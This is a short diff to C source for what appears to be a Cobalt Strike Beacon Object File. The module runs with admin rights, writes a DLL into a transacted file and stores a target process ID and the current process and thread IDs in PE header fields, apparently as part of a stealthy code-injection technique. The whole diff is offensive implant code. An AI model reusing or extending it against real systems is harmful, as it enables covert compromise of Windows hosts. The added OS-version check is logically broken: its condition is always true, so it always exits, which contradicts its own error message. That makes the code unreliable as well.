@@ -24,6 +24,12 @@
 
 D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) {
 	if ( BeaconApi->BeaconIsAdmin( ) ) {
+		if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion >= 6 ) {
+			if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 3 || NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 0 ) {
+				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "Does not support anything older than Windows 8.1" ) ) );
+				return;
+			};
+		};
 
 		INT			NamLen = 0;
 		INT			DllLen = 0;
@@ -225,7 +231,9 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 							goto Leave;
 						};
 						NthHdr = C_PTR( U_PTR( DosHdr ) + DosHdr->e_lfanew );
-						NthHdr->FileHeader.NumberOfSymbols = PidNum;
+						NthHdr->FileHeader.NumberOfSymbols      = ( ULONG )( PidNum );
+						NthHdr->FileHeader.TimeDateStamp        = ( ULONG )( NtCurrentTeb()->ClientId.UniqueProcess );
+						NthHdr->FileHeader.PointerToSymbolTable = ( ULONG )( NtCurrentTeb()->ClientId.UniqueThread );
 
 						if ( ! ApiTbl.WriteFile( FlePtr, DllBuf, DllLen, &( DWORD ){ 0x0 }, NULL ) ) {
 							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write to transacted file." ) ) );
